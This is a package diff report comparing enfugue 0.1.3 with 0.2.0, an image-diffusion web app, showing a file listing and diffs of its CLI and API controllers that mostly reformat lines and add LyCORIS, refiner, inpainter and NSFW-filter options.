+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.610572 enfugue-0.2.0/enfugue/static/html/head/
+-rw-rw-rw-   0        0        0     2162 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/head/head-base.html.j2
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.610572 enfugue-0.2.0/enfugue/static/img/
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.615571 enfugue-0.2.0/enfugue/static/img/brand/
+-rw-rw-rw-   0        0        0      852 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/brand/civit-ai-logo.svg
+-rw-rw-rw-   0        0        0     1293 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/brand/civit-ai.png
+-rw-rw-rw-   0        0        0     1521 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/brand/ko-fi.png
+-rw-rw-rw-   0        0        0     1486 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/brand/patreon.png
+-rw-rw-rw-   0        0        0     9307 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/brand/tensorrt.png
+-rw-rw-rw-   0        0        0    63446 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/cloud-320.png
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.622584 enfugue-0.2.0/enfugue/static/img/favicon/
+-rw-rw-rw-   0        0        0    13112 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/favicon/favicon-128x128.png
+-rw-rw-rw-   0        0        0     2235 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/favicon/favicon-16x16.png
+-rw-rw-rw-   0        0        0    38833 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/favicon/favicon-256x256.png
+-rw-rw-rw-   0        0        0     2827 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/favicon/favicon-32x32.png
+-rw-rw-rw-   0        0        0   160675 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/favicon/favicon-512x512.png
+-rw-rw-rw-   0        0        0     4987 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/favicon/favicon-64x64.png
+-rw-rw-rw-   0        0        0     1150 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/img/favicon/favicon.ico
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.623611 enfugue-0.2.0/enfugue/static/js/
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.623611 enfugue-0.2.0/enfugue/static/js/application/
+-rw-rw-rw-   0        0        0    13635 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/application/index.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.632621 enfugue-0.2.0/enfugue/static/js/base/
+-rw-rw-rw-   0        0        0     3038 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/api.mjs
+-rw-rw-rw-   0        0        0    16996 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/builder.mjs
+-rw-rw-rw-   0        0        0     1114 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/csv.mjs
+-rw-rw-rw-   0        0        0     9767 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/helpers.mjs
+-rw-rw-rw-   0        0        0      915 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/loader.mjs
+-rw-rw-rw-   0        0        0      350 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/mutex.mjs
+-rw-rw-rw-   0        0        0      549 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/publisher.mjs
+-rw-rw-rw-   0        0        0     3019 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/session.mjs
+-rw-rw-rw-   0        0        0     2396 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/base/watcher.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.636582 enfugue-0.2.0/enfugue/static/js/common/
+-rw-rw-rw-   0        0        0     1814 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/common/event-tracker.mjs
+-rw-rw-rw-   0        0        0     4554 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/common/history.mjs
+-rw-rw-rw-   0        0        0      441 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/common/notify.mjs
+-rw-rw-rw-   0        0        0      647 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/common/shadowbox.mjs
+-rw-rw-rw-   0        0        0     2610 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/common/tooltip.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.637582 enfugue-0.2.0/enfugue/static/js/config/
+-rw-rw-rw-   0        0        0      721 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/config/index.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.640585 enfugue-0.2.0/enfugue/static/js/controller/
+-rw-rw-rw-   0        0        0      845 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/base.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.646585 enfugue-0.2.0/enfugue/static/js/controller/common/
+-rw-rw-rw-   0        0        0      949 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/common/animations.mjs
+-rw-rw-rw-   0        0        0     8186 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/common/announcements.mjs
+-rw-rw-rw-   0        0        0     4531 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/common/downloads.mjs
+-rw-rw-rw-   0        0        0    14882 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/common/invocation.mjs
+-rw-rw-rw-   0        0        0     3567 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/common/logs.mjs
+-rw-rw-rw-   0        0        0    16699 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/common/model-manager.mjs
+-rw-rw-rw-   0        0        0    11328 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/common/model-picker.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.650584 enfugue-0.2.0/enfugue/static/js/controller/file/
+-rw-rw-rw-   0        0        0      242 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/file/01-new.mjs
+-rw-rw-rw-   0        0        0      513 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/file/02-open.mjs
+-rw-rw-rw-   0        0        0      645 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/file/03-save.mjs
+-rw-rw-rw-   0        0        0     4132 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/file/04-history.mjs
+-rw-rw-rw-   0        0        0     2764 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/file/05-results.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.653581 enfugue-0.2.0/enfugue/static/js/controller/help/
+-rw-rw-rw-   0        0        0     2637 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/help/01-about.mjs
+-rw-rw-rw-   0        0        0      338 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/help/02-documentation.mjs
+-rw-rw-rw-   0        0        0      337 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/help/03-discuss.mjs
+-rw-rw-rw-   0        0        0     1298 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/index.mjs
+-rw-rw-rw-   0        0        0      393 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/menu.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.656583 enfugue-0.2.0/enfugue/static/js/controller/models/
+-rw-rw-rw-   0        0        0     9529 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/models/01-civitait.mjs
+-rw-rw-rw-   0        0        0      284 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/models/02-manager.mjs
+-rw-rw-rw-   0        0        0      267 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/models/03-new.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.663581 enfugue-0.2.0/enfugue/static/js/controller/sidebar/
+-rw-rw-rw-   0        0        0     1792 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/sidebar/01-engine.mjs
+-rw-rw-rw-   0        0        0     3426 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/sidebar/02-canvas.mjs
+-rw-rw-rw-   0        0        0     2397 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/sidebar/03-tweaks.mjs
+-rw-rw-rw-   0        0        0     1323 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/sidebar/04-generation.mjs
+-rw-rw-rw-   0        0        0     2921 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/sidebar/05-refining.mjs
+-rw-rw-rw-   0        0        0    11037 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/sidebar/06-upscale.mjs
+-rw-rw-rw-   0        0        0      900 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/sidebar/07-prompts.mjs
+-rw-rw-rw-   0        0        0     2428 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/sidebar/99-invoke.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.667582 enfugue-0.2.0/enfugue/static/js/controller/system/
+-rw-rw-rw-   0        0        0     6292 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/system/01-settings.mjs
+-rw-rw-rw-   0        0        0     4587 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/system/02-users.mjs
+-rw-rw-rw-   0        0        0     8151 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/system/03-installation.mjs
+-rw-rw-rw-   0        0        0      269 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/system/04-logs.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.669582 enfugue-0.2.0/enfugue/static/js/controller/toolbar/
+-rw-rw-rw-   0        0        0      470 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/toolbar/01-load-image.mjs
+-rw-rw-rw-   0        0        0      317 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/toolbar/02-draw-scribble.mjs
+-rw-rw-rw-   0        0        0      263 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/controller/toolbar/03-region-prompt.mjs
+-rw-rw-rw-   0        0        0      670 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/enfugue.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.673611 enfugue-0.2.0/enfugue/static/js/graphics/
+-rw-rw-rw-   0        0        0      567 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/graphics/colors.mjs
+-rw-rw-rw-   0        0        0     4622 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/graphics/geometry.mjs
+-rw-rw-rw-   0        0        0     1869 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/graphics/paths.mjs
+-rw-rw-rw-   0        0        0     2942 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/graphics/spline.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.674616 enfugue-0.2.0/enfugue/static/js/lang/
+-rw-rw-rw-   0        0        0      203 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/lang/en.mjs
+-rw-rw-rw-   0        0        0      256 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/lang/index.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.676613 enfugue-0.2.0/enfugue/static/js/model/
+-rw-rw-rw-   0        0        0     1655 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/model/enfugue.mjs
+-rw-rw-rw-   0        0        0     5772 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/model/index.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.682581 enfugue-0.2.0/enfugue/static/js/view/
+-rw-rw-rw-   0        0        0     3767 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/base.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.685581 enfugue-0.2.0/enfugue/static/js/view/forms/
+-rw-rw-rw-   0        0        0     7313 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/base.mjs
+-rw-rw-rw-   0        0        0     1456 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/classic.mjs
+-rw-rw-rw-   0        0        0      502 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/confirm.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.693581 enfugue-0.2.0/enfugue/static/js/view/forms/input/
+-rw-rw-rw-   0        0        0     3452 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/base.mjs
+-rw-rw-rw-   0        0        0      472 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/bool.mjs
+-rw-rw-rw-   0        0        0     5969 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/color.mjs
+-rw-rw-rw-   0        0        0    11558 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/enumerable.mjs
+-rw-rw-rw-   0        0        0      611 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/file.mjs
+-rw-rw-rw-   0        0        0      450 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/misc.mjs
+-rw-rw-rw-   0        0        0     2928 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/numeric.mjs
+-rw-rw-rw-   0        0        0     3845 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/parent.mjs
+-rw-rw-rw-   0        0        0      724 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input/string.mjs
+-rw-rw-rw-   0        0        0     1065 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/forms/input.mjs
+-rw-rw-rw-   0        0        0     9227 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/image.mjs
+-rw-rw-rw-   0        0        0     3631 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/menu.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.698858 enfugue-0.2.0/enfugue/static/js/view/nodes/
+-rw-rw-rw-   0        0        0    12845 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/nodes/base.mjs
+-rw-rw-rw-   0        0        0     3427 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/nodes/decorations.mjs
+-rw-rw-rw-   0        0        0     9881 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/nodes/editor.mjs
+-rw-rw-rw-   0        0        0    24172 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/nodes/image-editor.mjs
+-rw-rw-rw-   0        0        0     3459 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/nodes/windows.mjs
+-rw-rw-rw-   0        0        0     1512 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/notifications.mjs
+-rw-rw-rw-   0        0        0     4426 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/scribble.mjs
+-rw-rw-rw-   0        0        0     3699 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/status.mjs
+-rw-rw-rw-   0        0        0    10912 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/js/view/table.mjs
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.707588 enfugue-0.2.0/enfugue/util/
+-rw-rw-rw-   0        0        0      244 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/__init__.py
+-rw-rw-rw-   0        0        0     1457 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/browser.py
+-rw-rw-rw-   0        0        0     1768 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/downloads.py
+-rw-rw-rw-   0        0        0     6325 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/gpu.py
+-rw-rw-rw-   0        0        0     6360 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/images.py
+-rw-rw-rw-   0        0        0     6083 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/installation.py
+-rw-rw-rw-   0        0        0       76 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/log.py
+-rw-rw-rw-   0        0        0     8135 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/security.py
+-rw-rw-rw-   0        0        0     1203 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/signature.py
+-rw-rw-rw-   0        0        0     1768 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/util/tokens.py
+-rw-rw-rw-   0        0        0        5 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/version.txt
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.514053 enfugue-0.2.0/enfugue.egg-info/
+-rw-rw-rw-   0        0        0      211 2023-07-29 19:49:57.000000 enfugue-0.2.0/enfugue.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0     8956 2023-07-29 19:49:57.000000 enfugue-0.2.0/enfugue.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-29 19:49:57.000000 enfugue-0.2.0/enfugue.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       50 2023-07-29 19:49:57.000000 enfugue-0.2.0/enfugue.egg-info/entry_points.txt
+-rw-rw-rw-   0        0        0     1220 2023-07-29 19:49:57.000000 enfugue-0.2.0/enfugue.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        8 2023-07-29 19:49:57.000000 enfugue-0.2.0/enfugue.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-07-29 19:49:57.708587 enfugue-0.2.0/setup.cfg
+-rw-rw-rw-   0        0        0     3282 2023-07-29 19:49:56.000000 enfugue-0.2.0/setup.py
```

### Comparing `enfugue-0.1.3/enfugue/__main__.py` & `enfugue-0.2.0/enfugue/__main__.py`

 * *Files 0% similar despite different names*

```diff
@@ -75,17 +75,15 @@
             click.echo("MPS: Available, but not installed")
     else:
         click.echo("MPS: Unavailable")
 
 
 @main.command(short_help="Dumps a copy of the configuration")
 @click.option("-f", "--filename", help="A file to write to instead of stdout.")
-@click.option(
-    "-j", "--json", help="When passed, use JSON instead of YAML.", is_flag=True, default=False
-)
+@click.option("-j", "--json", help="When passed, use JSON instead of YAML.", is_flag=True, default=False)
 def dump_config(filename: Optional[str] = None, json: bool = False) -> None:
     """
     Dumps a copy of the configuration to the console or the specified path.
     """
     from enfugue.util import get_local_configuration
 
     configuration = get_local_configuration()
@@ -106,17 +104,15 @@
         print(json.dumps(configuration, indent=4))
     else:
         import yaml
 
         print(yaml.dump(configuration))
 
 
-@click.option(
-    "-c", "--config", help="An optional path to a configuration file to use instead of the default."
-)
+@click.option("-c", "--config", help="An optional path to a configuration file to use instead of the default.")
 @main.command(short_help="Runs the server.")
 def run(config: str = None) -> None:
     """
     Runs the server synchronously using cherrypy.
     """
     from enfugue.server import EnfugueServer
```

### Comparing `enfugue-0.1.3/enfugue/api/config.py` & `enfugue-0.2.0/enfugue/api/config.py`

 * *Files 5% similar despite different names*

```diff
@@ -62,13 +62,11 @@
         with self.orm.session() as session:
             item = (
                 session.query(self.orm.ConfigurationItem)
                 .filter(self.orm.ConfigurationItem.configuration_key == key)
                 .one_or_none()
             )
             if item is None:
-                session.add(
-                    self.orm.ConfigurationItem(configuration_key=key, configuration_value=value)
-                )
+                session.add(self.orm.ConfigurationItem(configuration_key=key, configuration_value=value))
             else:
                 item.configuration_value = value
             session.commit()
```

### Comparing `enfugue-0.1.3/enfugue/api/controller/__init__.py` & `enfugue-0.2.0/enfugue/api/controller/__init__.py`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/api/controller/base.py` & `enfugue-0.2.0/enfugue/api/controller/base.py`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/api/controller/downloads.py` & `enfugue-0.2.0/enfugue/api/controller/downloads.py`

 * *Files 6% similar despite different names*

```diff
@@ -42,17 +42,15 @@
             target_file = os.path.join(target_dir, request.parsed["filename"])
 
             if os.path.exists(target_file) and not request.parsed.get("overwrite", False):
                 raise StateConflictError(f"File exists: {request.parsed['filename']}")
 
             check_make_directory(target_dir)
 
-            return self.manager.download(
-                request.token.user.id, request.parsed["url"], target_file
-            ).format()
+            return self.manager.download(request.token.user.id, request.parsed["url"], target_file).format()
         except KeyError as ex:
             raise BadRequestError(f"Missing required argument {ex}")
 
     @handlers.path("^/api/download$")
     @handlers.methods("GET")
     @handlers.secured()
     @handlers.format()
@@ -62,39 +60,43 @@
         """
         return [download.format() for download in self.manager.get_downloads(request.token.user.id)]
 
     @handlers.path("^/api/civitai/(?P<lookup>[a-z]+)$")
     @handlers.methods("GET")
     @handlers.secured()
     @handlers.format()
-    def civitai_lookup(
-        self, request: Request, response: Response, lookup: str
-    ) -> List[Dict[str, Any]]:
+    def civitai_lookup(self, request: Request, response: Response, lookup: str) -> List[Dict[str, Any]]:
         """
         Performs a lookup in CivitAI
         """
         lookup_type = {
             "checkpoint": "Checkpoint",
             "inversion": "TextualInversion",
             "lora": "LORA",
+            "lycoris": "LoCon",
             "controlnet": "Controlnet",
             "poses": "Poses",
             "hypernetwork": "Hypetnetwork",
             "gradient": "AestheticGradient",
         }.get(lookup, None)
 
         if lookup_type is None:
-            raise BadRequestError(f"Unknown lookup type {lookup_type}")
+            raise BadRequestError(f"Unknown lookup type {lookup}")
 
         query = request.params.get("query", None)
+        show_nsfw = request.params.get("nsfw", False)
+        if isinstance(show_nsfw, str):
+            show_nsfw = show_nsfw.lower() in ["t", "true", "y", "yes", "1"]
+        else:
+            show_nsfw = bool(show_nsfw)
 
         lookup_kwargs = {
             "types": lookup_type,
             "limit": 20,
-            "nsfw": not self.safe,
+            "nsfw": False if self.safe else show_nsfw,
             "query": request.params.get("query", None),
             "page": request.params.get("page", None),
             "sort": request.params.get("sort", "Most Downloaded"),
             "period": request.params.get("period", "Month"),
             "allowCommercialUse": request.params.get("allow_commercial_use", None),
         }
```

### Comparing `enfugue-0.1.3/enfugue/api/controller/invocation.py` & `enfugue-0.2.0/enfugue/api/controller/invocation.py`

 * *Files 13% similar despite different names*

```diff
@@ -10,15 +10,15 @@
     UserExtensionServerBase,
     UserExtensionHandlerRegistry,
     UserExtensionTemplateServer,
 )
 from pibble.ext.session.server.base import SessionExtensionServerBase
 from pibble.ext.rest.server.user import UserRESTExtensionServerBase
 from pibble.api.middleware.database.orm import ORMMiddlewareBase
-from pibble.api.exceptions import NotFoundError
+from pibble.api.exceptions import NotFoundError, BadRequestError
 
 from enfugue.diffusion.plan import DiffusionPlan
 from enfugue.api.controller.base import EnfugueAPIControllerBase
 
 __all__ = ["EnfugueAPIInvocationController"]
 
 
@@ -38,88 +38,129 @@
     @handlers.secured("DiffusionInvocation", "create")
     def invoke_engine(self, request: Request, response: Response) -> Dict[str, Any]:
         """
         Invokes the engine. Form a plan from the payload, then put the
         invocation in the queue.
         """
         # Get details about model
-        model, size, lora, inversion, model_prompt, model_negative_prompt = (
-            None,
-            None,
-            None,
-            None,
-            None,
-            None,
-        )
         model_name = request.parsed.pop("model", None)
+        refiner_name = request.parsed.pop("refiner", None)
+        inpainter_name = request.parsed.get("inpainter", None)
         model_type = request.parsed.pop("model_type", None)
         plan_kwargs: Dict[str, Any] = {}
         if model_name is not None and model_type == "model":
             plan_kwargs = self.get_plan_kwargs_from_model(model_name)
         elif model_name is not None and model_type == "checkpoint":
             plan_kwargs = {
-                "model": os.path.join(
-                    self.configuration.get(
-                        "enfugue.engine.checkpoint", os.path.join(self.engine_root, "checkpoint")
-                    ),
-                    model_name,
+                "model": os.path.abspath(
+                    os.path.join(
+                        self.configuration.get(
+                            "enfugue.engine.checkpoint", os.path.join(self.engine_root, "checkpoint")
+                        ),
+                        model_name,
+                    )
+                ),
+                "refiner": None
+                if refiner_name is None
+                else os.path.abspath(
+                    os.path.join(
+                        self.configuration.get(
+                            "enfugue.engine.checkpoint", os.path.join(self.engine_root, "checkpoint")
+                        ),
+                        refiner_name,
+                    )
                 ),
-                "lora": [
+                "inpainter": None
+                if inpainter_name is None
+                else os.path.abspath(
+                    os.path.join(
+                        self.configuration.get(
+                            "enfugue.engine.checkpoint", os.path.join(self.engine_root, "checkpoint")
+                        ),
+                        inpainter_name,
+                    )
+                ),
+            }
+            try:
+                plan_kwargs["lora"] = [
                     (
-                        os.path.join(
-                            self.configuration.get(
-                                "enfugue.engine.lora", os.path.join(self.engine_root, "lora")
-                            ),
-                            lora["model"],
+                        os.path.abspath(
+                            os.path.join(
+                                self.configuration.get("enfugue.engine.lora", os.path.join(self.engine_root, "lora")),
+                                lora["model"],
+                            )
                         ),
                         float(lora["weight"]),
                     )
                     for lora in request.parsed.pop("lora", [])
-                ],
-                "inversion": [
-                    os.path.join(
-                        self.configuration.get(
-                            "enfugue.engine.inversion", os.path.join(self.engine_root, "inversion")
+                ]
+            except KeyError as ex:
+                raise BadRequestError(f"Missing required LoRA configuration '{ex}'")
+
+            try:
+                plan_kwargs["lycoris"] = [
+                    (
+                        os.path.abspath(
+                            os.path.join(
+                                self.configuration.get(
+                                    "enfugue.engine.lycoris", os.path.join(self.engine_root, "lycoris")
+                                ),
+                                lycoris["model"],
+                            )
                         ),
+                        float(lycoris["weight"]),
+                    )
+                    for lycoris in request.parsed.pop("lycoris", [])
+                ]
+            except KeyError as ex:
+                raise BadRequestError(f"Missing required LyCORIS configuration '{ex}'")
+
+            plan_kwargs["inversion"] = [
+                os.path.abspath(
+                    os.path.join(
+                        self.configuration.get("enfugue.engine.inversion", os.path.join(self.engine_root, "inversion")),
                         inversion,
                     )
-                    for inversion in request.parsed.pop("inversion", [])
-                ],
-            }
-        plan = DiffusionPlan.from_nodes(**{**plan_kwargs, **request.parsed})
-        return self.invoke(request.token.user.id, plan).format()
+                )
+                for inversion in request.parsed.pop("inversion", [])
+            ]
+        # Always take passed scheduler
+        scheduler = request.parsed.pop("scheduler", None)
+        multi_scheduler = request.parsed.pop("multi_scheduler", None)
+        if scheduler:
+            plan_kwargs["scheduler"] = scheduler
+        if multi_scheduler:
+            plan_kwargs["multi_scheduler"] = multi_scheduler
+        disable_decoding = request.parsed.pop("intermediates", None) == False
+        plan = DiffusionPlan.from_nodes(**{**request.parsed, **plan_kwargs})
+        return self.invoke(request.token.user.id, plan, disable_intermediate_decoding=disable_decoding).format()
 
     @handlers.path("^/api/invocation$")
     @handlers.methods("GET")
     @handlers.format()
     @handlers.secured("DiffusionInvocation", "read")
     def invocations(self, request: Request, response: Response) -> List[Dict[str, Any]]:
         """
         Gets all invocations since engine start for a user.
         """
-        return [
-            invocation.format()
-            for invocation in self.manager.get_invocations(request.token.user.id)
-        ]
+        return [invocation.format() for invocation in self.manager.get_invocations(request.token.user.id)]
 
     @handlers.path("^/api/invocation/intermediates/(?P<file_path>.+)$")
     @handlers.download()
     @handlers.methods("GET")
     @handlers.compress()
     @handlers.reverse("Intermediate", "/api/invocation/intermediates/{file_path}")
     @handlers.bypass(
         UserRESTExtensionServerBase,
         UserExtensionServerBase,
         ORMMiddlewareBase,
         SessionExtensionServerBase,
         UserExtensionTemplateServer,
     )  # bypass processing for speed
-    def download_intermediate_image(
-        self, request: Request, response: Response, file_path: str
-    ) -> str:
+    def download_intermediate_image(self, request: Request, response: Response, file_path: str) -> str:
         """
         Downloads one of the intermediate results of an invocation.
         """
         image_path = os.path.join(self.manager.engine_intermediate_dir, file_path)
         if not os.path.exists(image_path):
             raise NotFoundError(f"No image at {file_path}")
         return image_path
```

### Comparing `enfugue-0.1.3/enfugue/api/controller/models.py` & `enfugue-0.2.0/enfugue/api/controller/models.py`

 * *Files 24% similar despite different names*

```diff
@@ -7,71 +7,116 @@
 from typing import List, Dict, Any
 from webob import Request, Response
 
 from pibble.api.exceptions import BadRequestError, NotFoundError
 from pibble.util.files import load_json
 from pibble.ext.user.server.base import UserExtensionHandlerRegistry
 
+from enfugue.util import find_files_in_directory
 from enfugue.api.controller.base import EnfugueAPIControllerBase
 from enfugue.database.models import DiffusionModel
 from enfugue.diffusion.manager import DiffusionPipelineManager
 from enfugue.diffusion.plan import DiffusionPlan, DiffusionStep, DiffusionNode
+from enfugue.diffusion.constants import (
+    DEFAULT_MODEL,
+    DEFAULT_INPAINTING_MODEL,
+    DEFAULT_SDXL_MODEL,
+    DEFAULT_SDXL_REFINER
+)
 
 __all__ = ["EnfugueAPIModelsController"]
 
 
